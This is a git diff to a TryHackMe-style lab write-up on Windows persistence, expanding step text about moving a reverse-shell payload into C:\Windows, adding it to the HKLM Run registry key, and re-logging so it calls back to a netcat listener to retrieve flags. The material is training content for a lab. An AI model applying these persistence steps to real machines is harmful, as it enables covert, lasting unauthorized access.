@@ -83,7 +83,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Windows\system32>
 ```
-10. `C:\flags\flag10.exe` from our reverse shell on our attack machine to run the **flag10.exe** program onto our terminal, which ended up containing this task's flag
+10. `C:\flags\flag10.exe` from our reverse shell on our attack machine to run the **flag10.exe** program, which ended up containing this task's flag and displaying it onto our terminal
 ```PowerShell
 C:\Windows\system32>C:\flags\flag10.exe
 C:\flags\flag10.exe
@@ -149,16 +149,14 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/7/2023   5:31 PM           7168 revshell.exe
 ```
-8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>`
+8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine to move our payload into the **C:\Windows** directory
 ```PowerShell
 PS C:\Users\Administrator>move revshell.exe C:\Windows
         1 file(s) moved.
 ```
-9. `regedit` and go to HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+9. `regedit` from the compromised Windows machine to launch the Registry Editor (**regedit**), which we'll then go to the **HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run** registry, which contains information about programs and processes that are configured to run automatically when Windows starts up, to create a new **REG_EXPAND_SZ** registry that'll have a value that corresponds to the full path of the command that we'd want to execute when the compromised Windows machine starts up, which is found over at **C:\Windows\<PAYLOAD NAME>.exe**
 ```PowerShell
 PS C:\Users\Administrator> regedit
-```PowerShell
-C:\Users\Administrator>regedit
 ```
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Open.png)
@@ -167,7 +165,7 @@ C:\Users\Administrator>regedit
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20HKEY_LOCAL_MACHINE%20Software%20Microsoft%20Windows%20CurrentVersion%20Run%20Payload.png)
 
-10. Sign out and log back in
+10. After successfully creating the new registry, we'll sign out and then sign back into the compromised machine, which should execute our payload once it's done starting up and connect to our attack machine's active netcat listener, which it did
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)
 
@@ -184,7 +182,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Windows\system32>
 ```
-11. `C:\flags\flag11.exe`
+11. `C:\flags\flag11.exe` from our reverse shell on our attack machine to run the **flag11.exe** program, which ended up containing the task's flag and displaying it onto our terminal
 ```PowerShell
 C:\Windows\system32>C:\flags\flag11.exe
 C:\flags\flag11.exe
